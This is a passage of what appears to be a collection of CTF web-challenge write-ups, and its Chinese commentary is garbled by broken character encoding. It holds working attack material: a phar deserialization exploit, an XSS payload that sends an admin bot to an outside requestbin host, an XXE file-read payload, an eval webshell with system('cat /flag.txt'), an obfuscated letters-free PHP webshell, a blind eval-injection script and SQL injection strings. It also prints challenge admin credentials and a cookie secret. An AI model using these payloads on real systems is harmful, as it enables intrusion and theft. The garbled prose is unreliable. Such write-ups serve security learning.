$this-\u0026gt;magic_quotes_status = -1; return; } } $a=new PclZip(\u0026#34;/var/www/html/data/attachment/brand/1.zip\u0026#34;);//å‹ç¼©çš„æ–‡ä»¶è·¯å¾„ echo serialize($a); $phar = new Phar(\u0026#34;phar.phar\u0026#34;); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); $phar-\u0026gt;setMetadata($a); $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;m0c1nu7\u0026#34;); $phar-\u0026gt;stopBuffering(); ?\u0026gt; http://acdb618d-67d7-416b-a534-23a858dbe1e4.node4.buuoj.cn:81/data/attachment/brand/2.txt\nä¹‹åè§¦å‘pharååºåˆ—åŒ–\nGET /admin.php?mod=moban\u0026amp;act=del\u0026amp;token=709991a77ab3f79e5dcad72d0453978e\u0026amp;tpl=phar:///var/www/html/data/attachment/brand/2.txt Referer: http://acdb618d-67d7-416b-a534-23a858dbe1e4.node4.buuoj.cn:81/admin.php?mod=moban è¿™é‡Œéœ€è¦ä¼ å…¥csrfçš„tokenï¼ˆpostä¸Šä¼ å¤„å¯ä»¥æ‹¿åˆ°ï¼‰ï¼Œè¿˜éœ€è¦è®¾ç½®ä¸€ä¸‹Referer\nflag{9085d530-559f-49bd-9e0e-718780146bd3}\n*[Zer0pts2020]musicblog æ³¨å†Œè´¦å·å¹¶ç™»å…¥ï¼Œå¯ä»¥åˆ›å»ºpostï¼Œå‹¾é€‰publishå¯ä»¥æœ‰adminè®¿é—®ï¼Œè¿™è‚¯å®šæ˜¯ä¸ªxssç±»çš„é¢˜ç›®äº†\næ•´ä¸ªç«™æœ‰æ¯”è¾ƒå®Œå–„çš„cspè§„åˆ™\nçœ‹ä¸‹worker.jsçš„å·¥ä½œé€»è¾‘\nconst fs = require(\u0026#39;fs\u0026#39;) const md5 = require(\u0026#39;md5\u0026#39;); const puppeteer = require(\u0026#39;puppeteer\u0026#39;); const Redis = require(\u0026#39;ioredis\u0026#39;); const connection = new Redis(6379, \u0026#39;redis\u0026#39;); const admin_username = \u0026#34;admin\u0026#34;; const admin_password = \u0026#34;w28J0zjqpp6w9Ty8Sl58Z7iEf4h911zZ\u0026#34;; const flag = \u0026#39;zer0pts{M4sh1m4fr3sh!!}\u0026#39;; const browser_option = { executablePath: \u0026#39;google-chrome-unstable\u0026#39;, headless: true, args: [ \u0026#39;--no-sandbox\u0026#39;, \u0026#39;--disable-background-networking\u0026#39;, \u0026#39;--disable-default-apps\u0026#39;, \u0026#39;--disable-extensions\u0026#39;, \u0026#39;--disable-gpu\u0026#39;, \u0026#39;--disable-sync\u0026#39;, \u0026#39;--disable-translate\u0026#39;, \u0026#39;--hide-scrollbars\u0026#39;, \u0026#39;--metrics-recording-only\u0026#39;, \u0026#39;--mute-audio\u0026#39;, \u0026#39;--no-first-run\u0026#39;, \u0026#39;--safebrowsing-disable-auto-update\u0026#39;, ], }; let browser = undefined; const crawl = async (url) =\u0026gt; { console.log(`[+] Query! (${url})`); const page = await browser.newPage(); try { await page.setUserAgent(flag); await page.goto(url, { waitUntil: \u0026#39;networkidle0\u0026#39;, timeout: 3 * 1000, }); page.click(\u0026#39;#like\u0026#39;); await page.waitForNavigation({timeout: 3000}); } catch (err){ console.log(err); } await page.close(); console.log(`[+] Done! (${url})`) }; const init = async () =\u0026gt; { const browser = await puppeteer.launch(browser_option); const page = await browser.newPage(); console.log(`[+] Setting up...`); try { await page.goto(`http://challenge/login.php`); await page.waitFor(\u0026#39;#username\u0026#39;); await page.type(\u0026#39;#username\u0026#39;, admin_username); await page.waitFor(\u0026#39;#password\u0026#39;); await page.type(\u0026#39;#password\u0026#39;, admin_password); await page.waitFor(\u0026#39;#login-submit\u0026#39;); await Promise.all([ page.$eval(\u0026#39;#login-submit\u0026#39;, elem =\u0026gt; elem.click()), page.waitForNavigation() ]); const body = await page.evaluate(() =\u0026gt; document.body.innerHTML); if (!body.includes(\u0026#39;href=\u0026#34;posts.php\u0026#34;\u0026#39;)){ throw Error(`Login failed at ${page.url()}.`); } console.log(`[+] Setup done!`); } catch (err) { console.log(`[-] Error while setting up :(`); console.log(err); const body = await page.evaluate(() =\u0026gt; document.body.innerHTML); console.log(`body: ${body}`); } try{ await page.close(); } catch (err) { console.log(err); } return browser; }; function handle(){ console.log(\u0026#34;[+] handle\u0026#34;); connection.blpop(\u0026#34;query\u0026#34;, 0, async function(err, message) { if (browser === undefined) browser = await init(); await crawl(\u0026#34;http://challenge/post.php?id=\u0026#34; + message[1]); setTimeout(handle, 10); // handle next }); } handle(); // first ignite å¯ä»¥çœ‹åˆ°æœ‰flagï¼Œè‚¯å®šæ˜¯è¦xssæ‹¿åˆ°ï¼›adminä¼šå…ˆç™»å…¥adminè´¦å·ï¼Œæ¥ç€crawl()è®¿é—®url\ntry { await page.setUserAgent(flag); await page.goto(url, { waitUntil: \u0026#39;networkidle0\u0026#39;, timeout: 3 * 1000, }); page.click(\u0026#39;#like\u0026#39;); await page.waitForNavigation({timeout: 3000}); } catch (err){ console.log(err); } ä¼šç‚¹å‡»é¡µé¢çš„#likeï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢åˆ›å»ºPostæ—¶å‹¾é€‰çš„æ¡†\næ³¨æ„åˆ°å®ƒå¯¹æ ‡ç­¾çš„è¿‡æ»¤ï¼Œä½†æ˜¯å…è®¸\u0026lt;audio\u0026gt;çš„å­˜åœ¨\næŸ¥èµ„æ–™å¯çŸ¥strip_tagsæœ‰å®‰å…¨é—®é¢˜ï¼Œå®ƒä¸ä¼šè¿‡æ»¤\u0026lt;a/udio\u0026gt;æ ‡ç­¾ï¼Œå¹¶ä¸”\u0026lt;a/udio\u0026gt;ä¼šä½œä¸ºè¶…é“¾æ¥\u0026lt;a\u0026gt;è¢«è§£æï¼ŒåŒæ—¶è¶…é“¾æ¥çš„è·³è½¬æ˜¯ä¸å—cspçš„æ§åˆ¶çš„ï¼Œpayload\n\u0026lt;a/udio id=like href=\u0026#34;http://http.requestbin.buuoj.cn/v4c4pyv4\u0026#34;\u0026gt;aa\u0026lt;/a/udio\u0026gt; buuæ”¹k8sä¹‹åå†…ç½‘çš„é¢˜å¤šå°‘æœ‰ç‚¹é—®é¢˜ï¼Œä¸€ç›´æ‹¿ä¸åˆ°flagï¼Œå¯„\n[FireshellCTF2020]Cars è¿™å’‹å°±apkäº†â€¦â€¦ç®—äº†ï¼Œæ‘çœ‹\nåœ¨Rest.ktä¸­çœ‹åˆ°ä¸‰ä¸ªè·¯ç”±\nåœ¨domainç›®å½•ä¸‹å¯ä»¥çœ‹åˆ°å¯¹åº”æ¥æ”¶çš„å‚æ•°æ ¼å¼ï¼Œ/commentå¯ä»¥ä¼ å…¥nameå’Œmessageï¼›åœ¨CommentActivityä¸­æœ‰ä¸ªsend_commentè°ƒç”¨äº†postComment\nè¿™é‡Œä½¿ç”¨äº†GsonConvertFactoryï¼Œè¿™æ˜¯ä¸€ä¸ªè§£æjsonçš„åº“ï¼ŒåŒæ—¶è¿™é‡Œè¿˜å¼•å…¥äº†retrofit2ï¼Œç»™æˆ‘ä»¬xxeçš„å¯èƒ½\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;ISO-8859-1\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ELEMENT foo ANY \u0026gt; \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///flag\u0026#34; \u0026gt; ]\u0026gt; \u0026lt;Comment\u0026gt; \u0026lt;name\u0026gt;\u0026amp;xxe;\u0026lt;/name\u0026gt; \u0026lt;message\u0026gt;flag please!\u0026lt;/message\u0026gt; \u0026lt;/Comment\u0026gt; è®°å¾—ä¿®æ”¹Content-Typeä¸ºapplication/xml\nflag{d96dc7a4-8be4-4e05-9bbf-64fcf8009182}\n[ç½‘é¼æ¯ 2020 æ€»å†³èµ›]Novel åªçœ‹ç»™çš„é™„ä»¶ï¼Œå¤§æ¦‚æ‰«ä¸€ä¸‹çŒœæµ‹æ˜¯ä¸ªååºåˆ—åŒ–çš„é¢˜ï¼›ç„¶åçœ‹ä¸‹é¡µé¢äº¤äº’ï¼Œå¥½åƒè·ŸçŒœçš„æœ‰ä¸€ç‚¹ä¸å¤ªä¸€æ ·ï¼Œå¯ä»¥é€‰æ‹©ç§è—ï¼Œä¼špostè®¿é—®/back/backupï¼Œå¯¹åº”çš„æ˜¯back.class.php ä¼ å…¥filenameå’Œpathï¼Œé€‰æ‹©ä¸Šä¼ æ–‡ä»¶ä¼špostè®¿é—®/upload/profileï¼Œå¯¹åº”çš„æ˜¯upload.class.php\nindex.phpä¸­å…³é”®å¤„åœ¨è¿™é‡Œ\nbackç±»ä¸­é™¤backupå¤–è¿˜æœ‰ä¸‰ä¸ªç§æœ‰å‡½æ•°_write, _create, random_code\tï¼Œåœ¨è°ƒç”¨backupæ—¶ä¼šå…ˆä¾æ¬¡è°ƒç”¨è¿™å‡ ä¸ªå‡½æ•°è¿›è¡Œå¤„ç†\nbackupä¸­ï¼Œé¦–å…ˆåˆ¤æ–­profile/ä¸‹æœ‰æ²¡æœ‰åŒåæ–‡ä»¶ï¼Œå¯¹å†…å®¹è¿›è¡Œhtmlspecialcharså¤„ç†åï¼Œå…ˆæ˜¯ç”¨random_codeç”Ÿæˆéšæœºå¯†ç ï¼Œç„¶åè¿›è¡Œ\n$this-\u0026gt;_write($dest, $this-\u0026gt;_create($password, $content)); _createä¼šå°†å¯†ç å’Œå†…å®¹æ‹¼åˆ°ä¸€èµ·\nprivate function _create($password, $content){ $_content=\u0026#39;\u0026lt;?php $_GET[\u0026#34;password\u0026#34;]===\u0026#34;\u0026#39;.$password.\u0026#39;\u0026#34;?print(\u0026#34;\u0026#39;.$content.\u0026#39;\u0026#34;):exit(); \u0026#39;; return $_content; } éšåè¿›å…¥_write\nprivate function _write($dest, $content){ $f1=$dest; $f2=\u0026#39;private/\u0026#39;.$this-\u0026gt;random_code(10).\u0026#34;.php\u0026#34;; $stream_f1 = fopen($f1, \u0026#39;w+\u0026#39;); fwrite($stream_f1, $content); rewind($stream_f1); $f1_read=fread($stream_f1, 3000); preg_match(\u0026#39;/^\u0026lt;\\?php \\$_GET\\[\\\u0026#34;password\\\u0026#34;\\]===\\\u0026#34;[a-zA-Z0-9]{8}\\\u0026#34;\\?print\\(\\\u0026#34;.*\\\u0026#34;\\):exit\\(\\); $/s\u0026#39;, $f1_read, $matches); if(!empty($matches[0])){ copy($f1,$f2); fclose($stream_f1); return $f2; }else{ fwrite($stream_f1, \u0026#39;\u0026lt;?php exit(); ?\u0026gt;\u0026#39;); fclose($stream_f1); return false; } } å…ˆå°†$destå’Œä¸Šé¢_createç”Ÿæˆçš„å†…å®¹æ‹¼ä¸€èµ·ï¼Œç„¶åå¯¹å†…å®¹è¿›è¡Œè¿‡æ»¤å¤„ç†ï¼Œé€šè¿‡è¿‡æ»¤çš„è¯å°†ä¼šåœ¨/privateç›®å½•ä¸‹å­˜ä¸€ä»½å¤‡ä»½æ–‡ä»¶å¹¶è¿”å›å®Œæ•´è·¯å¾„ï¼Œæ²¡é€šè¿‡è¿‡æ»¤çš„è¯ä¼šåœ¨æ–‡ä»¶ä¸­å†™å…¥æ­»äº¡exit\næˆ‘ä»¬çš„æ”»å‡»æ€è·¯æ˜¯ä¸Šä¼ ä¸€ä¸ªtxtï¼Œä¹‹åé€šè¿‡backç”Ÿæˆåç¼€ä¸ºphpçš„å¤‡ä»½æ–‡ä»¶ï¼Œæ‹¿webshellï¼›æ„é€ payload\namiz.txt\n{${eval($_GET[1])}} GET /private/mKrZmVugUo.php?password=4lsUOHWN\u0026amp;1=system(\u0026#39;cat /flag.txt\u0026#39;); flag{913c1949-edef-4459-8ffc-7970b9c93f14}\næ³¨æ„è¿™é‡Œé¡µé¢ä¸Šä¼ çš„æ—¶å€™è¦åŒå‡»submitæ‰ä¼šå¼¹å‡ºæ–‡ä»¶ç®¡ç†å™¨\n[Windows]LFI2019 å¼€å¹•é›·å‡»ï¼Œç›´æ¥å°±æ˜¯phpinfoçš„èƒŒæ™¯ï¼Œæ˜¾ç¤ºæ˜¯ä¸€ä¸ªwindowsç³»ç»Ÿï¼Œæ²¡æœ‰disable_functionsä¹Ÿæ²¡æœ‰open_basedir\næœ‰ä¸‰ä¸ªæŒ‰é’®ï¼Œinfoæç¤ºflagåœ¨flag.phpï¼Œuploadå¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œincludeå¯ä»¥åŒ…å«ï¼›ç»™äº†æºç ï¼Œè¿˜æŒºé•¿çš„ï¼ŒäºŒç™¾å¤šè¡Œ\nå¤§å¤šæ˜¯ä¸€äº›åŸºç¡€æ“ä½œï¼Œé˜²xss, ssrf, sessionï¼Œæœ‰å‡ ä¸ªç±»æ¯”è¾ƒæ˜¾çœ¼ï¼Œé¦–å…ˆæ˜¯Getï¼Œå®ƒæ˜¯includeæ—¶è°ƒç”¨çš„ç±»ï¼Œä¼šnewä¸€ä¸ªå®ä¾‹ç„¶åè°ƒç”¨å…¶ä¸­çš„get\nclass Get { protected function nanahira(){ // senpai notice me // function exploit($data){ $exploit = new System(); } $_GET[\u0026#39;trigger\u0026#39;] \u0026amp;\u0026amp; !@@@@@@@@@@@@@exploit($$$$$$_GET[\u0026#39;leak\u0026#39;][\u0026#39;leak\u0026#39;]); } private $filename; function __construct($filename){ $this-\u0026gt;filename = path_sanitizer($filename); } function get(){ if($this-\u0026gt;filename === false){ return [\u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;blocked by path sanitizer\u0026#34;, \u0026#34;type\u0026#34; =\u0026gt; \u0026#34;error\u0026#34;]; } // wtf???? // if(!@file_exists($this-\u0026gt;filename)){ // index files are *completely* disabled. // if(stripos($this-\u0026gt;filename, \u0026#34;index\u0026#34;) !== false){ return [\u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;you cannot include index files!\u0026#34;, \u0026#34;type\u0026#34; =\u0026gt; \u0026#34;error\u0026#34;]; } // hardened sanitizer spawned. thus we sense ambiguity // $read_file = \u0026#34;./files/\u0026#34; . $this-\u0026gt;filename; $read_file_with_hardened_filter = \u0026#34;./files/\u0026#34; . path_sanitizer($this-\u0026gt;filename, true); if($read_file === $read_file_with_hardened_filter || @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter)){ return [\u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;request blocked\u0026#34;, \u0026#34;type\u0026#34; =\u0026gt; \u0026#34;error\u0026#34;]; } // .. and finally, include *un*exploitable file is included. // @include(\u0026#34;./files/\u0026#34; . $this-\u0026gt;filename); return [\u0026#34;type\u0026#34; =\u0026gt; \u0026#34;success\u0026#34;]; }else{ return [\u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;invalid filename (wtf)\u0026#34;, \u0026#34;type\u0026#34; =\u0026gt; \u0026#34;error\u0026#34;]; } } } å…¶ä¸­å¯¹æ–‡ä»¶åçš„wafæ˜¯path_sanitizerï¼Œé»‘åå•æŒºç‹ çš„\nfunction path_sanitizer($dir, $harden=false){ $dir = (string)$dir; $dir_len = strlen($dir); // Deny LFI/RFI/XSS // $filter = [\u0026#39;.\u0026#39;, \u0026#39;./\u0026#39;, \u0026#39;~\u0026#39;, \u0026#39;.\\\\\u0026#39;, \u0026#39;#\u0026#39;, \u0026#39;\u0026lt;\u0026#39;, \u0026#39;\u0026gt;\u0026#39;]; foreach($filter as $f){ if(stripos($dir, $f) !== false){ return false; } } // Deny SSRF and all possible weird bypasses // $stream = stream_get_wrappers(); $stream = array_merge($stream, stream_get_transports()); $stream = array_merge($stream, stream_get_filters()); foreach($stream as $f){ $f_len = strlen($f); if(substr($dir, 0, $f_len) === $f){ return false; } } // Deny length // if($dir_len \u0026gt;= 128){ return false; } // Easy level hardening // if($harden){ $harden_filter = [\u0026#34;/\u0026#34;, \u0026#34;\\\\\u0026#34;]; foreach($harden_filter as $f){ $dir = str_replace($f, \u0026#34;\u0026#34;, $dir); } } // Sanitize feature is available starting from the medium level // return $dir; } $filenameå•ç‹¬ç»è¿‡wafä¹‹åå¾—åˆ°çš„æ–‡ä»¶è·¯å¾„$read_file_with_hardened_filterå¿…é¡»å’Œä¹‹å‰çš„$read_fileä¸åŒï¼Œè¯»åˆ°çš„æ–‡ä»¶å†…å®¹ä¹Ÿå¿…é¡»ä¸åŒ\npostçš„åœ°æ–¹ç”¨çš„æ˜¯Putç±»ï¼Œå¤§å·®ä¸å·®ï¼Œå¤šäº†ä¸ªå¯¹codeçš„wafï¼Œcode_sanitizer\nfunction code_sanitizer($code){ // Computer-chan, please don\u0026#39;t speak english. Speak something else! // $code = preg_replace(\u0026#34;/[^\u0026lt;\u0026gt;!@#$%\\^\u0026amp;*\\_?+\\.\\-\\\\\\\u0026#39;\\\u0026#34;\\=\\(\\)\\[\\]\\;]/u\u0026#34;, \u0026#34;*Nope*\u0026#34;, (string)$code); return $code; } æ­£å¸¸linuxä¸‹å†™å…¥testæ–‡ä»¶ï¼ŒåŒ…å«test\\ï¼Œç»è¿‡wafä¹‹åå¾—åˆ°./files/testï¼Œä½†æ˜¯å¤„ç†å‰çš„./files/test\\æ— æ³•è¯»å–æ–‡ä»¶å†…å®¹ï¼Œå¤±è´¥\nè¿™é‡Œç”¨åˆ°çš„trickæ˜¯windowsä¸‹æ‰§è¡Œfile_get_contentsæ—¶ä¼šæŠŠ\u0026quot;è§£é‡Šä¸º.\nfile_get_contents(\u0026#39;test.php\u0026#39;) === file_get_contents(\u0026#39;test\u0026#34;php\u0026#39;) åˆ©ç”¨è¿™ä¸ªtrickï¼Œä¸Šä¼ æ–‡ä»¶åä¸ºtestï¼Œè¯»å–æ–‡ä»¶åä¸º\u0026quot;/testï¼Œè¿‡wafåè·¯å¾„ä¸º./files/.testï¼Œå¤„ç†å‰è·¯å¾„ä¸º./files/./testï¼Œå¯ä»¥æ­£å¸¸è¯»å–æ–‡ä»¶å†…å®¹\nå…³äºshellï¼Œç»§ç»­ç”¨pç‰›çš„è¿™ç¯‡ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell\n\u0026lt;?=$_=[];$_=\u0026#34;$_\u0026#34;;$_=$_[(\u0026#34;!\u0026#34;==\u0026#34;!\u0026#34;)+(\u0026#34;!\u0026#34;==\u0026#34;!\u0026#34;)+(\u0026#34;!\u0026#34;==\u0026#34;!\u0026#34;)];$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___=$_;$___++;$___++;$___++;$___++;$____=$_;$_____=$_;$_____++;$_____++;$_____++;$______=$_;$______++;$______++;$______++;$______++;$______++;$__=$__.$___.$____.$_____.$______;$___=$_;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$_____++;$_____++;$_____++;$_____++;$__=$__.$___.$____.$_____;$___=$_;$___++;$___++;$___++;$___++;$___++;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$______=$_;$______++;$______++;$______++;$______++;$______++;$______++;$___=$___.$____.$_____.$______;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$_____++;$_____++;$_____++;$_____++;$_____++;$_____++;$_____++;$___=$___.\u0026#39;.\u0026#39;.$____.$_____.$____;$__($___);?\u0026gt; æ³¨æ„å¯¹+è¿›è¡Œurlç¼–ç \nflag{f5bf0f29-bb51-4f28-b9ee-d9ef9b1e3915}\nâ€”â€”â€”â€”ä¹‹åçœ‹æ›´å¤šå¸ˆå‚…ä»¬çš„wpï¼Œå‘ç°ç”±äºæ˜¯winçš„ç¯å¢ƒè¿˜å¯ä»¥æœ‰åˆ«çš„trickæ¥åˆ©ç”¨\nwinä¸‹æœ‰ç£ç›˜æµåˆ›å»ºç›®å½•çš„æ–¹å¼\nå½“file_put_contentsä¼ å…¥çš„æ–‡ä»¶åä¸ºamiz::$INDEX_ALLOCATIONæ—¶ å°±ä¼šåœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹åˆ›å»ºä¸€ä¸ªåä¸ºamizçš„æ–‡ä»¶å¤¹ï¼Œå†…å®¹ä¸ºç©º\næˆ‘ä»¬å…ˆç”¨putåˆ›å»ºæ–‡ä»¶å¤¹ï¼Œå†putå‘è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹å†™shellï¼Œæœ€ååŒ…å«è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹çš„shellå°±å¯ä»¥äº†\nå‚è€ƒï¼šwp1 | wp2\n*[RCTF2019]calcalcalc | char-by-char-sqli ç»™äº†æºç ï¼Œç¦»è°±ï¼Œæœ‰3ä¸ªè¯­è¨€çš„åç«¯ï¼Œpho nodejs python\u0026hellip;\u0026hellip;..\nå…ˆçœ‹å‰ç«¯ï¼Œfrontend/views/index.hbs\nä¼špostæ–¹å¼è¯·æ±‚/calculateï¼Œä½†å¥½åƒä¹Ÿç®—ä¸äº†å•¥ä¸œè¥¿ï¼Œè¿”å›201ï¼Œç„¶åæ˜¯frontend/src/app.controller.ts\næœ‰ä¸€è¯´ä¸€tsæˆ‘çœ‹èµ·æ¥å¥½è´¹åŠ²â€¦â€¦å®ƒè¿˜æ¶‰åŠåˆ°å¦å¤–ä¸¤ä¸ªæ–‡ä»¶ï¼Œcalculate.model.ts\nå…¶ä¸­ç”¨åˆ°çš„@ExpressionValidatorï¼Œexpresssion.validator.ts\nå¦‚æœ18è¡Œçš„isVipä¸ºfalseï¼Œå°±ä¼šåˆ¤æ–­é•¿åº¦ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä¼ å…¥jsonï¼Œè®¾å®ƒä¸ºtrue\nä¸‰ä¸ªåç«¯éƒ½ä¼šå¯¹æˆ‘ä»¬è¯·æ±‚çš„å¼å­è¿›è¡Œè¿ç®—ï¼Œä½†åªæœ‰ä¸‰ä¸ªè¿”å›ç»“æœä¸€è‡´æ—¶æ‰å¯ä»¥é€šè¿‡\nPythonçš„åç«¯æœ‰å¤„ç†postè¯·æ±‚çš„éƒ¨åˆ†ï¼Œbackend-python/src/app.py\nä¼šå°†è¯·æ±‚çš„expressionå‚æ•°è¿›è¡Œjsonå¤„ç†åevalï¼Œé‚£å…¥æ‰‹ç‚¹å°±åœ¨è¿™é‡Œäº†ï¼›ä½†æ˜¯13è¡Œçš„è§„åˆ™æ¯”è¾ƒä¸¥è‹›ï¼Œæˆ‘ä»¬é‡‡ç”¨chr()çš„æ–¹å¼ç»•è¿‡\nä½†æ˜¯ç”±äºå®ƒæ²¡æœ‰æ˜ç¡®çš„å›æ˜¾ï¼Œå¹¶ä¸”åç«¯å¤„äºå†…ç½‘ä¸­ä¸èƒ½å¤–å¸¦æ•°æ®ï¼Œæ‰€ä»¥é‡‡ç”¨æ—¶é—´ç›²æ³¨çš„æ€æƒ³ï¼Œé…åˆäºŒåˆ†çš„è„šæœ¬æ‹¿flag\n*ç”±äºbuuojçš„å†…ç½‘ç¯å¢ƒé—®é¢˜ï¼Œè¿™é‡Œåšä¸äº†ï¼Œæ‰€ä»¥åªå†™ä¸€ä¸‹è„šæœ¬ï¼Œç­‰å•¥æ—¶å€™ä¿®å¤äº†å†å›æ¥åšï¼ˆè„šæœ¬å‚è€ƒguokeå¸ˆå‚…çš„ï¼ŒäºŒåˆ†æ³•\næ ¸å¿ƒçš„ç›²æ³¨payloadæ˜¯è¿™ä¸ª\n__import__(\u0026#39;time\u0026#39;).sleep(5) if (ord(open(\u0026#39;/flag\u0026#39;,\u0026#39;r\u0026#39;).read() [str(i)])\u0026gt;str(mid))else 1 è¦è¿‡wafï¼Œæ‰€ä»¥è½¬ä¸ºchr()çš„å½¢å¼ï¼Œå¤–é¢åŒ…ä¸€å±‚eval\nimport requests import time x=\u0026#39;\u0026#39; def getpayload(num,mid): payload=\u0026#34;__import__(\u0026#39;time\u0026#39;).sleep(5) if (ord(open(\u0026#39;/flag\u0026#39;,\u0026#39;r\u0026#39;).read()[\u0026#34;+str(num)+\u0026#34;])\u0026gt;\u0026#34;+str(mid)+\u0026#34;) else 1\u0026#34; data=\u0026#39;\u0026#39; for i in payload: data+=\u0026#39;chr(\u0026#39;+str(ord(i))+\u0026#39;)+\u0026#39; return(\u0026#39;eval(\u0026#39;+data[:-1]+\u0026#39;)\u0026#39;) url=\u0026#39;xxxx/calculate\u0026#39; for a in range(0,60): max = 130 min = 30 while max \u0026gt;=min: mid=(max+min)//2 payload=getpayload(a,mid) time1=time.time() r = requests.post(url, json={\u0026#39;isVip\u0026#39;: True, \u0026#39;expression\u0026#39;: payload}) time2=time.time() if (time2-time1\u0026gt;5): min=mid+1 else: max=mid if max==mid==min: x+=chr(mid) print(str(a)+\u0026#39;:\u0026#39;+x) break å‚è€ƒï¼šwp | wp2\n[QWB2021 Quals]æ‰˜çº³å¤š | sqli processlistè¡¨ ssti æ³¨å†Œè´¦å·ç™»å…¥ï¼Œä½†æ˜¯åªæœ‰adminæ‰æœ‰flagï¼Œé‚£è‚¯å®šå¾—è¦sqliäº†ï¼Œåœ¨ç™»å½•çš„åœ°æ–¹æ³¨äº†åŠå¤©ï¼Œç»“æœå‘ç°æ³¨å…¥ç‚¹åœ¨æ³¨å†Œçš„é¡µé¢ï¼ˆå°´å°¬ï¼‰ï¼Œç›´æ¥å•å¼•å·å°±å¯ä»¥é—­åˆ\nadmin\u0026#39;or \u0026#39;1\t# å›æ˜¾this username had been used å‚è€ƒå®˜æ–¹wpï¼Œè¿™é‡Œç”¨çš„æ˜¯processlistè¡¨ï¼Œè¿™ä¸ªè¡¨å¾ˆç‰¹åˆ«\nå®ƒè¯»å–æ­£åœ¨æ‰§è¡Œçš„sqlè¯­å¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡infoåˆ—æ¥è·å¾—å½“å‰çš„è¡¨ååˆ—åï¼Œè¿˜æ˜¯ç”¨ç¥–ä¼ çš„äºŒåˆ†æ³•æ¥çˆ†adminçš„å¯†ç \nï¼ˆå°´å°¬çš„æ˜¯çˆ†ä¸€ä¼šå„¿å°±å¯„äº†ï¼Œå®³ï¼Œå¯„å¯„å¯„\næŒ‰ç…§é¢„æœŸè§£ï¼Œç™»å…¥åå¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè¯»/proc/self/cmdlineå¯ä»¥çœ‹åˆ°python3 /qwb/app/app.pyï¼Œæ— æ³•ç›´æ¥è¯»app.pyï¼Œä½†æ˜¯å¯ä»¥è¯»pyc\nhttpçš„å“åº”å¤´ä¸­æœ‰tornadoçš„ç‰ˆæœ¬å·6.0.3ï¼Œå¯¹åº”çš„python\u0026gt;=3.5ï¼Œçˆ†ç ´ä¸€ä¸‹pycçš„åç§°ï¼Œå¾—åˆ°pyc\n/qwbimage.php?qwb_image_name=/qwb/app/__pycache__/app.cpython-35.pyc uncompyle6åç¼–è¯‘å¾—åˆ°æºç \nimport tornado.ioloop, tornado.web, tornado.options, pymysql, os, re settings = {\u0026#39;static_path\u0026#39;: os.path.join(os.getcwd(), \u0026#39;static\u0026#39;), \u0026#39;cookie_secret\u0026#39;: \u0026#39;b93a9960-bfc0-11eb-b600-002b677144e0\u0026#39;} db_username = \u0026#39;root\u0026#39; db_password = \u0026#39;xxxx\u0026#39; class MainHandler(tornado.web.RequestHandler): def get(self): user = self.get_secure_cookie(\u0026#39;user\u0026#39;) if user and user == b\u0026#39;admin\u0026#39;: self.redirect(\u0026#39;/admin.php\u0026#39;, permanent=True) return self.render(\u0026#39;index.html\u0026#39;) class LoginHandler(tornado.web.RequestHandler): def get(self): username = self.get_argument(\u0026#39;username\u0026#39;, \u0026#39;\u0026#39;) password = self.get_argument(\u0026#39;password\u0026#39;, \u0026#39;\u0026#39;) if not username or not password: if not self.get_secure_cookie(\u0026#39;user\u0026#39;): self.finish(\u0026#39;\u0026lt;script\u0026gt;alert(`please input your password and username`);history.go(-1);\u0026lt;/script\u0026gt;\u0026#39;) return if self.get_secure_cookie(\u0026#39;user\u0026#39;) == b\u0026#39;admin\u0026#39;: self.redirect(\u0026#39;/admin.php\u0026#39;, permanent=True) else: self.redirect(\u0026#39;/\u0026#39;, permanent=True) else: conn = pymysql.connect(\u0026#39;localhost\u0026#39;, db_username, db_password, \u0026#39;qwb\u0026#39;) cursor = conn.cursor() cursor.execute(\u0026#39;SELECT * from qwbtttaaab111e where qwbqwbqwbuser=%s and qwbqwbqwbpass=%s\u0026#39;, [username, password]) results = cursor.fetchall() if len(results) != 0: if results[0][1] == \u0026#39;admin\u0026#39;: self.set_secure_cookie(\u0026#39;user\u0026#39;, \u0026#39;admin\u0026#39;) cursor.close() conn.commit() conn.close() self.redirect(\u0026#39;/admin.php\u0026#39;, permanent=True) return else: cursor.close() conn.commit() conn.close() self.finish(\u0026#39;\u0026lt;script\u0026gt;alert(`login success, but only admin can get flag`);history.go(-1);\u0026lt;/script\u0026gt;\u0026#39;) return else: cursor.close() conn.commit() conn.close() self.finish(\u0026#39;\u0026lt;script\u0026gt;alert(`your username or password is error`);history.go(-1);\u0026lt;/script\u0026gt;\u0026#39;) return class RegisterHandler(tornado.web.RequestHandler): def get(self): username = self.get_argument(\u0026#39;username\u0026#39;, \u0026#39;\u0026#39;) password = self.get_argument(\u0026#39;password\u0026#39;, \u0026#39;\u0026#39;) word_bans = [\u0026#39;table\u0026#39;, \u0026#39;col\u0026#39;, \u0026#39;sys\u0026#39;, 